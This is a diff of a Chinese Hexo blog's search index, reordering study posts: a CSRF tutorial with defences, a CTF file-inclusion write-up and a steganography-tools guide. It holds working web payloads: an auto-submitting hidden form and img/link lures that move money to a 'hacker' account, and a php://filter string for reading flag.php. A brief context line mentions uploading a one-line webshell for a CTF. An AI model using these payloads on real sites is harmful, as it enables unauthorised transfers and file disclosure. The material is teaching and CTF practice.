@@ -1,6 +1,57 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>CSRF攻击</title>
+    <url>/post/44b0db89.html</url>
+    <content><![CDATA[<p>　　学习了这部分之后，我感觉之前qq空间链接的那种盗号方式，应该就是这个原理<a id="more"></a></p>
+<h1 id="1-什么是CSRF"><a href="#1-什么是CSRF" class="headerlink" title="1.什么是CSRF"></a>1.什么是CSRF</h1><p>　　跨站请求伪造（Cross-site request forgery，CSRF），也被称为one click attack/session riding，通常缩写是CSRF/XSRF。</p>
+<h1 id="2-CSRF可以做些什么"><a href="#2-CSRF可以做些什么" class="headerlink" title="2.CSRF可以做些什么"></a>2.CSRF可以做些什么</h1><p>　　可以简单理解为：<font color="ff0000">攻击者盗用了你的身份，以你的名义发送恶意请求</font>，它利用网站对用户网页浏览器的信任。如：转移资金、修改电子邮件地址、密码。    </p>
+<h1 id="3-CSRF原理"><a href="#3-CSRF原理" class="headerlink" title="3.CSRF原理"></a>3.CSRF原理</h1><p>　　<font color="ff0000">受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求 <a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2</a> 可以使 Bob 把 1000000 的存款转到 bob2 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该 session 的用户 Bob 已经成功登陆。</font></p>
+<p>　　<font color="ff0000">黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。Mallory 可以自己发送一个请求给银行：<a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory%E3%80%82%E4%BD%86%E6%98%AF%E8%BF%99%E4%B8%AA%E8%AF%B7%E6%B1%82%E6%9D%A5%E8%87%AA">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory。但是这个请求来自</a> Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。</font></p>
+<p>　　<font color="ff0000">这时，Mallory 想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入如下代码： src=”<a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</a> ”，并且通过广告等诱使 Bob 来访问他的网站。当 Bob 访问该网站时，上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器。大多数情况下，该请求会失败，因为他要求 Bob 的认证信息。但是，如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 Bob 的认证信息。这时，悲剧发生了，这个 url 请求就会得到响应，钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。 </font></p>
+<p><img src="https://s3.ax1x.com/2021/01/11/s1xb59.png" alt="s1xb59.png"></p>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>Bob打开浏览器，访问受信任银行网站，输入用户名和密码请求登录网站；</span><br><span class="line"><span class="number">2.</span>在Bob信息通过验证后，银行网站产生Cookie信息并返回给浏览器，此时Bob登录网站成功，可以正常发送请求到网站；</span><br><span class="line"><span class="number">3.</span>Bob未退出银行网站之前，在同一浏览器中，打开一个TAB页访问其他网站B</span><br><span class="line"><span class="number">4.</span>这时候网站B 已被黑客注入诱导信息，加入是一张图片,图片地址指向</span><br><span class="line">   src=”http:<span class="comment">//bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=hacker</span></span><br><span class="line">  点击之后转账给黑客这个账户</span><br><span class="line"><span class="number">5.</span>浏览器在接收到这些攻击性代码请求后，根据网站B的请求，在Bob不知情的情况下携带Cookie信息，根据用户的Cookie信息以Bob的权限处理该请求，导致来自黑客请求恶意代码被执行。 </span><br></pre></td></tr></table></figure>
+
+<h1 id="4-CSRF攻击类型"><a href="#4-CSRF攻击类型" class="headerlink" title="4.CSRF攻击类型"></a>4.CSRF攻击类型</h1><h2 id="4-1-GET类型的CSRF"><a href="#4-1-GET类型的CSRF" class="headerlink" title="4.1 GET类型的CSRF"></a>4.1 GET类型的CSRF</h2><p>GET类型的CSRF利用非常简单，只需要HTTP请求，一般这样利用：</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">![](https:<span class="regexp">//</span>awps-assets.meituan.net<span class="regexp">/mit-x/</span>blog-images-bundle-<span class="number">2018</span>b<span class="regexp">/ff0cdbee.example/</span>withdraw?amount=<span class="number">10000</span>&amp;<span class="keyword">for</span>=hacker)</span><br></pre></td></tr></table></figure>
+
+<p>在受害者访问含有这个img的页面后，浏览器会自动向<code>http://bank.example/withdraw?account=xiaoming&amp;amount=10000&amp;for=hacker</code>发出一次HTTP请求。bank.example就会收到包含受害者登录信息的一次跨域请求。</p>
+<h2 id="4-2-POST类型的CSRF"><a href="#4-2-POST类型的CSRF" class="headerlink" title="4.2 POST类型的CSRF"></a>4.2 POST类型的CSRF</h2><p>这种类型的CSRF利用起来通常使用的是一个自动提交的表单，如：</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line"> &lt;form action=<span class="string">&quot;http://bank.example/withdraw&quot;</span> method=POST&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;account&quot;</span> value=<span class="string">&quot;xiaoming&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;amount&quot;</span> value=<span class="string">&quot;10000&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;for&quot;</span> value=<span class="string">&quot;hacker&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;!--自动提交表单--&gt;</span><br><span class="line">&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; </span><br></pre></td></tr></table></figure>
+
+<p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。POST类型的攻击通常比GET要求更加严格一点，但扔并不复杂。任何个人网站、博客，被黑客上传页面的往回走哪都有可能是发起攻击的来源。</p>
+<h2 id="4-3-链接类型的CSRF"><a href="#4-3-链接类型的CSRF" class="headerlink" title="4.3 链接类型的CSRF"></a>4.3 链接类型的CSRF</h2><p>这种需要用户点击链接才会触发。这种类型通常是杂论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，例如：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;http://test.com/csrf/withdraw.php?amount=1000&amp;for=hacker&quot;</span> taget=<span class="string">&quot;_blank&quot;</span>&gt;</span><br><span class="line">  重磅消息！！</span><br><span class="line">  &lt;a/&gt;</span><br></pre></td></tr></table></figure>
+
+<p>由于之前用户登陆的信任的网站A，并且保存登录状态，只要用户主动访问上面的这个PHP页面，就表示攻击成功。</p>
+<h1 id="5-CSRF的特点"><a href="#5-CSRF的特点" class="headerlink" title="5.CSRF的特点"></a>5.CSRF的特点</h1><ul>
+<li>攻击一般发起在第三方网站，而不是被攻击的网站。</li>
+<li>攻击利用受害者在被攻击网站的登陆凭证，冒充受害者提交操作。</li>
+<li>整个过程攻击者并不能获取到受害者的登陆凭证，仅仅是冒用。</li>
+</ul>
+<h1 id="6-防护措施"><a href="#6-防护措施" class="headerlink" title="6.防护措施"></a>6.防护措施</h1><h2 id="6-1-验证HTTP-Referer字段"><a href="#6-1-验证HTTP-Referer字段" class="headerlink" title="6.1 验证HTTP Referer字段"></a>6.1 验证HTTP Referer字段</h2><p>HTTP头中有一个Referer的字段，它记录了该HTTP请求的来源网址</p>
+<p><img src="https://s3.ax1x.com/2021/01/11/s1xHUJ.png" alt="s1xHUJ.png"></p>
+<p>　　也就是说，服务器会验证客户端的请求来源，如果是本网站请求的就响应，否则不响应。</p>
+<p>　　正如上文所提到的，Bob必须登录银行网站，通过页面上的按钮触发转账事件。当用户提交请求时，该转账请求的Referer值就会是转账按钮所在页面的URL。黑客只能在自己网站构造请求，当用户通过攻击者的网站发送请求到银行时，该请求的Referer是指向黑客的网站。所以不能响应。</p>
+<p>但是这种方式仍然<font color="ff000">存在安全隐患</font></p>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>对于某些浏览器，比如IE6或FF2，目前已经有一些方法可以篡改Referer值</span><br><span class="line"><span class="number">2.</span>用户自己可以这只浏览器使其请求时不再提供Referer</span><br></pre></td></tr></table></figure>
+
+<h2 id="6-2-使用token（Anti-CSRF-Token）"><a href="#6-2-使用token（Anti-CSRF-Token）" class="headerlink" title="6.2 使用token（Anti CSRF Token）"></a>6.2 使用token（Anti CSRF Token）</h2><p>可以理解为防伪</p>
+<p>例子：</p>
+<p>1.用户访问某个表单页面。</p>
+<p>2.服务端生成一个Token，放在用户的Session中，或者浏览器的Cookie中。</p>
+<p>3.在页面表单附带上Token参数。</p>
+<p>4.用户提交请求后， 服务端验证表单中的Token是否与用户Session（或Cookies）中的      Token一致，一致为合法请求，不是则非法请求。</p>
+<p>　　这个Token的值必须是随机的。由于Token的存在，攻击者无法再构造一个带有合法Token的请求实施CSRF攻击。另外使用Token时应注意Token的保密性，尽量把敏感操作由GET改为<code>POST</code>，以form或AJAX形式提交，避免Token泄露。</p>
+]]></content>
+      <categories>
+        <category>网络安全知识学习</category>
+      </categories>
+      <tags>
+        <tag>CSRF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>BUUCTF_Web</title>
     <url>/post/282276cb.html</url>
     <content><![CDATA[<h1 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h1><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>首先，先上传一句话木马文件</p>
@@ -64,67 +115,6 @@
 <h1 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h1>]]></content>
   </entry>
   <entry>
-    <title>CSRF攻击</title>
-    <url>/post/44b0db89.html</url>
-    <content><![CDATA[<p>　　学习了这部分之后，我感觉之前qq空间链接的那种盗号方式，应该就是这个原理<a id="more"></a></p>
-<h1 id="1-什么是CSRF"><a href="#1-什么是CSRF" class="headerlink" title="1.什么是CSRF"></a>1.什么是CSRF</h1><p>　　跨站请求伪造（Cross-site request forgery，CSRF），也被称为one click attack/session riding，通常缩写是CSRF/XSRF。</p>
-<h1 id="2-CSRF可以做些什么"><a href="#2-CSRF可以做些什么" class="headerlink" title="2.CSRF可以做些什么"></a>2.CSRF可以做些什么</h1><p>　　可以简单理解为：<font color="ff0000">攻击者盗用了你的身份，以你的名义发送恶意请求</font>，它利用网站对用户网页浏览器的信任。如：转移资金、修改电子邮件地址、密码。    </p>
-<h1 id="3-CSRF原理"><a href="#3-CSRF原理" class="headerlink" title="3.CSRF原理"></a>3.CSRF原理</h1><p>　　<font color="ff0000">受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求 <a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2</a> 可以使 Bob 把 1000000 的存款转到 bob2 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该 session 的用户 Bob 已经成功登陆。</font></p>
-<p>　　<font color="ff0000">黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。Mallory 可以自己发送一个请求给银行：<a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory%E3%80%82%E4%BD%86%E6%98%AF%E8%BF%99%E4%B8%AA%E8%AF%B7%E6%B1%82%E6%9D%A5%E8%87%AA">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory。但是这个请求来自</a> Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。</font></p>
-<p>　　<font color="ff0000">这时，Mallory 想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入如下代码： src=”<a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</a> ”，并且通过广告等诱使 Bob 来访问他的网站。当 Bob 访问该网站时，上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器。大多数情况下，该请求会失败，因为他要求 Bob 的认证信息。但是，如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 Bob 的认证信息。这时，悲剧发生了，这个 url 请求就会得到响应，钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。 </font></p>
-<p><img src="https://s3.ax1x.com/2021/01/11/s1xb59.png" alt="s1xb59.png"></p>
-<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>Bob打开浏览器，访问受信任银行网站，输入用户名和密码请求登录网站；</span><br><span class="line"><span class="number">2.</span>在Bob信息通过验证后，银行网站产生Cookie信息并返回给浏览器，此时Bob登录网站成功，可以正常发送请求到网站；</span><br><span class="line"><span class="number">3.</span>Bob未退出银行网站之前，在同一浏览器中，打开一个TAB页访问其他网站B</span><br><span class="line"><span class="number">4.</span>这时候网站B 已被黑客注入诱导信息，加入是一张图片,图片地址指向</span><br><span class="line">   src=”http:<span class="comment">//bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=hacker</span></span><br><span class="line">  点击之后转账给黑客这个账户</span><br><span class="line"><span class="number">5.</span>浏览器在接收到这些攻击性代码请求后，根据网站B的请求，在Bob不知情的情况下携带Cookie信息，根据用户的Cookie信息以Bob的权限处理该请求，导致来自黑客请求恶意代码被执行。 </span><br></pre></td></tr></table></figure>
-
-<h1 id="4-CSRF攻击类型"><a href="#4-CSRF攻击类型" class="headerlink" title="4.CSRF攻击类型"></a>4.CSRF攻击类型</h1><h2 id="4-1-GET类型的CSRF"><a href="#4-1-GET类型的CSRF" class="headerlink" title="4.1 GET类型的CSRF"></a>4.1 GET类型的CSRF</h2><p>GET类型的CSRF利用非常简单，只需要HTTP请求，一般这样利用：</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">![](https:<span class="regexp">//</span>awps-assets.meituan.net<span class="regexp">/mit-x/</span>blog-images-bundle-<span class="number">2018</span>b<span class="regexp">/ff0cdbee.example/</span>withdraw?amount=<span class="number">10000</span>&amp;<span class="keyword">for</span>=hacker)</span><br></pre></td></tr></table></figure>
-
-<p>在受害者访问含有这个img的页面后，浏览器会自动向<code>http://bank.example/withdraw?account=xiaoming&amp;amount=10000&amp;for=hacker</code>发出一次HTTP请求。bank.example就会收到包含受害者登录信息的一次跨域请求。</p>
-<h2 id="4-2-POST类型的CSRF"><a href="#4-2-POST类型的CSRF" class="headerlink" title="4.2 POST类型的CSRF"></a>4.2 POST类型的CSRF</h2><p>这种类型的CSRF利用起来通常使用的是一个自动提交的表单，如：</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line"> &lt;form action=<span class="string">&quot;http://bank.example/withdraw&quot;</span> method=POST&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;account&quot;</span> value=<span class="string">&quot;xiaoming&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;amount&quot;</span> value=<span class="string">&quot;10000&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;for&quot;</span> value=<span class="string">&quot;hacker&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;!--自动提交表单--&gt;</span><br><span class="line">&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; </span><br></pre></td></tr></table></figure>
-
-<p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。POST类型的攻击通常比GET要求更加严格一点，但扔并不复杂。任何个人网站、博客，被黑客上传页面的往回走哪都有可能是发起攻击的来源。</p>
-<h2 id="4-3-链接类型的CSRF"><a href="#4-3-链接类型的CSRF" class="headerlink" title="4.3 链接类型的CSRF"></a>4.3 链接类型的CSRF</h2><p>这种需要用户点击链接才会触发。这种类型通常是杂论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，例如：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;http://test.com/csrf/withdraw.php?amount=1000&amp;for=hacker&quot;</span> taget=<span class="string">&quot;_blank&quot;</span>&gt;</span><br><span class="line">  重磅消息！！</span><br><span class="line">  &lt;a/&gt;</span><br></pre></td></tr></table></figure>
-
-<p>由于之前用户登陆的信任的网站A，并且保存登录状态，只要用户主动访问上面的这个PHP页面，就表示攻击成功。</p>
-<h1 id="5-CSRF的特点"><a href="#5-CSRF的特点" class="headerlink" title="5.CSRF的特点"></a>5.CSRF的特点</h1><ul>
-<li>攻击一般发起在第三方网站，而不是被攻击的网站。</li>
-<li>攻击利用受害者在被攻击网站的登陆凭证，冒充受害者提交操作。</li>
-<li>整个过程攻击者并不能获取到受害者的登陆凭证，仅仅是冒用。</li>
-</ul>
-<h1 id="6-防护措施"><a href="#6-防护措施" class="headerlink" title="6.防护措施"></a>6.防护措施</h1><h2 id="6-1-验证HTTP-Referer字段"><a href="#6-1-验证HTTP-Referer字段" class="headerlink" title="6.1 验证HTTP Referer字段"></a>6.1 验证HTTP Referer字段</h2><p>HTTP头中有一个Referer的字段，它记录了该HTTP请求的来源网址</p>
-<p><img src="https://s3.ax1x.com/2021/01/11/s1xHUJ.png" alt="s1xHUJ.png"></p>
-<p>　　也就是说，服务器会验证客户端的请求来源，如果是本网站请求的就响应，否则不响应。</p>
-<p>　　正如上文所提到的，Bob必须登录银行网站，通过页面上的按钮触发转账事件。当用户提交请求时，该转账请求的Referer值就会是转账按钮所在页面的URL。黑客只能在自己网站构造请求，当用户通过攻击者的网站发送请求到银行时，该请求的Referer是指向黑客的网站。所以不能响应。</p>
-<p>但是这种方式仍然<font color="ff000">存在安全隐患</font></p>
-<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>对于某些浏览器，比如IE6或FF2，目前已经有一些方法可以篡改Referer值</span><br><span class="line"><span class="number">2.</span>用户自己可以这只浏览器使其请求时不再提供Referer</span><br></pre></td></tr></table></figure>
-
-<h2 id="6-2-使用token（Anti-CSRF-Token）"><a href="#6-2-使用token（Anti-CSRF-Token）" class="headerlink" title="6.2 使用token（Anti CSRF Token）"></a>6.2 使用token（Anti CSRF Token）</h2><p>可以理解为防伪</p>
-<p>例子：</p>
-<p>1.用户访问某个表单页面。</p>
-<p>2.服务端生成一个Token，放在用户的Session中，或者浏览器的Cookie中。</p>
-<p>3.在页面表单附带上Token参数。</p>
-<p>4.用户提交请求后， 服务端验证表单中的Token是否与用户Session（或Cookies）中的      Token一致，一致为合法请求，不是则非法请求。</p>
-<p>　　这个Token的值必须是随机的。由于Token的存在，攻击者无法再构造一个带有合法Token的请求实施CSRF攻击。另外使用Token时应注意Token的保密性，尽量把敏感操作由GET改为<code>POST</code>，以form或AJAX形式提交，避免Token泄露。</p>
-]]></content>
-      <categories>
-        <category>网络安全知识学习</category>
-      </categories>
-      <tags>
-        <tag>CSRF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Drops CTF</title>
-    <url>/post/d02a9bc8.html</url>
-    <content><![CDATA[<h1 id="ZUT第一届信安杯"><a href="#ZUT第一届信安杯" class="headerlink" title="ZUT第一届信安杯"></a>ZUT第一届信安杯</h1><h2 id="file-include"><a href="#file-include" class="headerlink" title="file_include"></a>file_include</h2><p><a href="https://blog.csdn.net/wo41ge/article/details/109948000">php伪协议</a></p>
-<p>我们打开网页只能看到一张图片，看题目是文件包含漏洞</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="regexp">//</span>filter<span class="regexp">/read=convert.base64-encode/</span>resource=flag.php</span><br></pre></td></tr></table></figure>
-
-<p>ctf-file-1</p>
-]]></content>
-  </entry>
-  <entry>
     <title>CSS学习</title>
     <url>/post/238675c9.html</url>
     <content><![CDATA[<p>基本了解CSS<a id="more"></a></p>
@@ -160,6 +150,103 @@
       <tags>
         <tag>CSS</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Drops CTF</title>
+    <url>/post/d02a9bc8.html</url>
+    <content><![CDATA[<h1 id="ZUT第一届信安杯"><a href="#ZUT第一届信安杯" class="headerlink" title="ZUT第一届信安杯"></a>ZUT第一届信安杯</h1><h2 id="file-include"><a href="#file-include" class="headerlink" title="file_include"></a>file_include</h2><p><a href="https://blog.csdn.net/wo41ge/article/details/109948000">php伪协议</a></p>
+<p>我们打开网页只能看到一张图片，看题目是文件包含漏洞</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="regexp">//</span>filter<span class="regexp">/read=convert.base64-encode/</span>resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<p>ctf-file-1</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>CTF隐写术工具</title>
+    <url>/post/fa8f33cf.html</url>
+    <content><![CDATA[<p>　　隐写术是一门关于信息隐藏的技巧与科学，所谓信息隐藏指的是不让除预期的接受者之外的任何人知道信息的传递事件或内容。<a id="more"></a></p>
+<h2 id="隐写术用到的工具"><a href="#隐写术用到的工具" class="headerlink" title="隐写术用到的工具"></a>隐写术用到的工具</h2><h3 id="1-16进制修改器"><a href="#1-16进制修改器" class="headerlink" title="1.16进制修改器"></a>1.16进制修改器</h3><h3 id="2-binwalk（Linux）"><a href="#2-binwalk（Linux）" class="headerlink" title="2.binwalk（Linux）"></a>2.binwalk（Linux）</h3><p>分析文件信息，用来查看文件中是否包含其他隐藏文件，简单用法：</p>
+<p><code>binwalk filename</code> 分析构成</p>
+<p><code>binwalk -e filename</code>自动解压已知文件格式</p>
+<p><code>binwalk -D=[extension] filename</code>根据后缀名解压，如-D=zip等</p>
+<h3 id="3-StegSolve（Windows）"><a href="#3-StegSolve（Windows）" class="headerlink" title="3.StegSolve（Windows）"></a>3.StegSolve（Windows）</h3><p>能够对常见的照片格式进行偏移、LSB提取、帧提取、拉长等</p>
+<h3 id="4-Stegdetect（Windows）"><a href="#4-Stegdetect（Windows）" class="headerlink" title="4.Stegdetect（Windows）"></a>4.Stegdetect（Windows）</h3><p>用于检测JPEG文件中是否包含隐藏内容，并尝试分析是哪个工具嵌入的，使用方式：</p>
+<p><code>stegdetect [-nqV] [-s &lt;float&gt;] [-d &lt;num&gt;] [-t &lt;tests&gt;] [file.jpg]</code></p>
+<table>
+<thead>
+<tr>
+<th>参数信息</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-q 仅显示可能包含隐藏内容的图像。</td>
+</tr>
+<tr>
+<td>-n 启用检查 JPEG 文件头功能，以降低误报率。如果启用，所有带有批注区域的文件将被视为没有被嵌入信息。如果 JPEG 文件的 JFIF 标识符中的版本号不是1.1，则禁用 OutGuess 检测。</td>
+</tr>
+<tr>
+<td>-s 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。</td>
+</tr>
+<tr>
+<td>-d 打印带行号的调试信息。</td>
+</tr>
+<tr>
+<td>-t 设置要检测哪些隐写工具（默认检测 jopi），可设置的选项如下： j 检测图像中的信息是否是用 jsteg 嵌入的。 o  检测图像中的信息是否是用 outguess 嵌入的。 p 检测图像中的信息是否是用 jphide 嵌入的。 i 检测图像中的信息是否是用  invisible secrets 嵌入的。</td>
+</tr>
+</tbody></table>
+<h3 id="5-Outguess（Windows）"><a href="#5-Outguess（Windows）" class="headerlink" title="5.Outguess（Windows）"></a>5.Outguess（Windows）</h3><p>提取JPEG文件中使用Outguess算法的加入的隐藏信息</p>
+<h3 id="6-MP3Stego（Windows）"><a href="#6-MP3Stego（Windows）" class="headerlink" title="6.MP3Stego（Windows）"></a>6.MP3Stego（Windows）</h3><p>对于MP3音频文件的隐写和提取，如一个名为“123.mp3”的文件</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>decode -X -P 123.mp3</td>
+<td>提取123mp3信息到123.txt中</td>
+</tr>
+<tr>
+<td>encode -E 123.txt -P pass 123.mp3</td>
+<td>把123.txt文件写入123.mp3中</td>
+</tr>
+</tbody></table>
+<p><a href="https://www.petitcolas.net/steganography/mp3stego/">下载链接</a></p>
+<h3 id="7-ZipCenOp伪加密（Windows）"><a href="#7-ZipCenOp伪加密（Windows）" class="headerlink" title="7.ZipCenOp伪加密（Windows）"></a>7.ZipCenOp伪加密（Windows）</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>java -jar ZipCenOp.jar e xxx.zip</td>
+<td>加密</td>
+</tr>
+<tr>
+<td>java -jar ZipCenOp.jar r xxx.zip</td>
+<td>解密</td>
+</tr>
+</tbody></table>
+<p><img src="https://s3.ax1x.com/2020/11/29/D6LBon.jpg" alt="D6LBon.jpg"></p>
+<p><strong>a.压缩源文件数据区：</strong></p>
+<p>50 4B 03 04：这是头文件标记（0x04034b50）<br> 14 00：解压文件所需 pkware 版本<br> 09 00：全局方式位标记（有无加密）<br> 08 00：压缩方式<br> 50 A3：最后修改文件时间<br> A5 4A：最后修改文件日期<br> 21 38 76 64：CRC-32校验（1480B516）<br> 19 00 00 00：压缩后尺寸（25）<br> 17 00 00 00：未压缩尺寸（23）<br> 08 00：文件名长度<br> 00 00：扩展记录长度</p>
+<p>666C61672E7478744BCB494CAF764CC935F4D3753272D7CD0ED50D8EF20CA80500</p>
+<p><strong>b.压缩源文件目录区:</strong></p>
+<p>50 4B 01 02：目录中文件文件头标记(0x02014b50)<br> 1F 00：压缩使用的 pkware 版本<br> 14 00：解压文件所需 pkware 版本<br> 09 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）<br> 08 00：压缩方式<br> 50 A3：最后修改文件时间<br> A5 4A：最后修改文件日期<br> 21 38 76 65：CRC-32校验（1480B516）<br> 19 00 00 00：压缩后尺寸（25）<br> 17 00 00 00：未压缩尺寸（23）<br> 08 00：文件名长度<br> 24 00：扩展字段长度<br> 00 00：文件注释长度<br> 00 00：磁盘开始号<br> 00 00：内部文件属性<br> 20 00 00 00：外部文件属性<br> 00 00 00 00：局部头部偏移量<br> 666C61672E7478740A00200000000000010018000FF504D59AC5D201461FCB8A9AC5D201461FCB8A9AC5D201</p>
+<p><strong>c.压缩源文件目录结束标志:</strong></p>
+<p>50 4B 05 06：目录结束标记<br> 00 00：当前磁盘编号<br> 00 00：目录区开始磁盘编号<br> 01 00：本磁盘上纪录总数<br> 01 00：目录区中纪录总数<br> 5A 00 00 00：目录区尺寸大小<br> 3F 00 00 00：目录区对第一张磁盘的偏移量<br> 00 00 00：ZIP 文件注释长度</p>
+<h4 id="识别真假加密"><a href="#识别真假加密" class="headerlink" title="识别真假加密"></a>识别真假加密</h4><p><strong>无加密</strong><br> 压缩源文件数据区的全局加密应当为00 00<br> 且压缩源文件目录区的全局方式位标记应当为00 00</p>
+<p><strong>假加密</strong><br> 压缩源文件数据区的全局加密应当为00 00<br> 且压缩源文件目录区的全局方式位标记应当为09 00</p>
+<p><strong>真加密</strong><br> 压缩源文件数据区的全局加密应当为09 00<br> 且压缩源文件目录区的全局方式位标记应当为09 00</p>
+<p>把09 00 改成00 00 之后，保存，重新打开，即可看到flag</p>
+<h3 id="8-Steghide"><a href="#8-Steghide" class="headerlink" title="8.Steghide"></a>8.Steghide</h3><h3 id="9-cloacked-pixel"><a href="#9-cloacked-pixel" class="headerlink" title="9.cloacked-pixel"></a>9.cloacked-pixel</h3><p>用于lsb解密，但是没有密码</p>
+<p>python2 lsb.py extract flag.png 1.txt password</p>
+]]></content>
+      <categories>
+        <category>第一届DMCTF夺旗赛</category>
+      </categories>
   </entry>
   <entry>
     <title>HTML学习</title>
@@ -256,93 +343,6 @@
       <tags>
         <tag>HTML</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>CTF隐写术工具</title>
-    <url>/post/fa8f33cf.html</url>
-    <content><![CDATA[<p>　　隐写术是一门关于信息隐藏的技巧与科学，所谓信息隐藏指的是不让除预期的接受者之外的任何人知道信息的传递事件或内容。<a id="more"></a></p>
-<h2 id="隐写术用到的工具"><a href="#隐写术用到的工具" class="headerlink" title="隐写术用到的工具"></a>隐写术用到的工具</h2><h3 id="1-16进制修改器"><a href="#1-16进制修改器" class="headerlink" title="1.16进制修改器"></a>1.16进制修改器</h3><h3 id="2-binwalk（Linux）"><a href="#2-binwalk（Linux）" class="headerlink" title="2.binwalk（Linux）"></a>2.binwalk（Linux）</h3><p>分析文件信息，用来查看文件中是否包含其他隐藏文件，简单用法：</p>
-<p><code>binwalk filename</code> 分析构成</p>
-<p><code>binwalk -e filename</code>自动解压已知文件格式</p>
-<p><code>binwalk -D=[extension] filename</code>根据后缀名解压，如-D=zip等</p>
